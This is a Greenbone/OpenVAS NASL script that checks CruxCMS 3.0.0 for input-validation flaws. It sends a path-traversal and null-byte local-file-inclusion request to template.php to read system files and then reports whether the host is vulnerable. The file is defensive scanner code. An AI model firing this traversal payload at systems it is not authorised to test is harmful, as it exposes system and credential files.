# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:cruxsoftware:cruxcms";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103015");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-01-05 15:07:33 +0100 (Wed, 05 Jan 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("CruxCMS Multiple Input Validation Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45594");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/515444");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("gb_crux_products_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cruxcms/detected");

  script_tag(name:"summary", value:"CruxCMS is prone to multiple input-validation vulnerabilities,
  including multiple security-bypass issues, multiple arbitrary-file-
  upload issues, multiple SQL-injection issues, a local file-include
  issue, a cross-site-scripting issue and multiple information-
  disclosure issues. These issues occur because the application fails to
  properly sanitize user-supplied input.");

  script_tag(name:"impact", value:"Exploiting these issues may allow an unauthorized user to view files
  and execute local scripts, execute arbitrary script code, bypass certain security restrictions, access
  or modify data, exploit latent vulnerabilities in the underlying database, gain administrative
  access, steal cookie-based authentication credentials, and launch
  other attacks.");

  script_tag(name:"affected", value:"CruxCMS 3.0.0 is vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port, service:"www"))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {

  url = string(dir, "/includes/template.php?style=", crap(data:"../", length:3*15), files[file], "%00");

  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
